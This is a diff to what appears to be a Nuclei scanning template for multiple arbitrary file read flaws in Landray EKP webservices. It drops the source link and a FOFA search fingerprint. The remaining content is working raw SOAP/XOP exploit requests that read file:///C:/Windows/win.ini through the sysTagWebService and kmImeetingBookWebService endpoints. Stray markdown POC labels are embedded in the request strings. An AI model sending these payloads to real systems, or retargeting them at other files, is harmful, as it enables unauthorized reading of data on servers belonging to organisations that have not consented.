@@ -3,12 +3,8 @@ info:
   name: 蓝凌EKP系统webservice多个任意文件读取漏洞（合集）
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rpirfz3kx3twczak'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rpirfz3kx3twczak
-    fofa: body="Com_Parameter"
 http:
 - raw:
   - "POST /sys/webservice/sysTagWebService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36\nConnection: close\nContent-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz\nSOAPAction: \"\"\nAccept-Encoding: gzip, deflate\n\n------4upt9dwdca8rtwq9osuz\nContent-Disposition: form-data; name=\"a\"\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.tag.sys.kmss.landray.com/\">\n<soapenv:Header/>\n<soapenv:Body>\n    <web:getGroups>\n        <arg0>\n            <beginTimeStamp>a</beginTimeStamp>\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\n        </arg0>\n    </web:getGroups>\n</soapenv:Body>\n</soapenv:Envelope>\n------4upt9dwdca8rtwq9osuz--\n\n**POC-2**"
@@ -25,7 +21,7 @@ http:
     - 500
     type: status
 - raw:
-  - "POST /sys/webservice/kmImeetingBookWebService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36\nConnection: close\nContent-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz\nSOAPAction: \"\"\nAccept-Encoding: gzip, deflate\n\n------4upt9dwdca8rtwq9osuz\nContent-Disposition: form-data; name=\"a\"\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.imeeting.km.kmss.landray.com/\">\n<soapenv:Header/>\n<soapenv:Body>\n    <web:getImeetingBookLists>\n        <arg0>\n            <beginTimeStamp>a</beginTimeStamp>\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\n        </arg0>\n    </web:getImeetingBookLists>\n</soapenv:Body>\n</soapenv:Envelope>\n------4upt9dwdca8rtwq9osuz--\n\n\n**POC-4**"
+  - "POST /sys/webservice/kmImeetingBookWebService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36\nConnection: close\nContent-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz\nSOAPAction: \"\"\nAccept-Encoding: gzip, deflate\n\n------4upt9dwdca8rtwq9osuz\nContent-Disposition: form-data; name=\"a\"\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.imeeting.km.kmss.landray.com/\">\n<soapenv:Header/>\n<soapenv:Body>\n    <web:getImeetingBookLists>\n        <arg0>\n            <beginTimeStamp>a</beginTimeStamp>\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\n        </arg0>\n    </web:getImeetingBookLists>\n</soapenv:Body>\n</soapenv:Envelope>\n------4upt9dwdca8rtwq9osuz--\n\n**POC-4**"
   redirects: false
   matchers:
   - status:
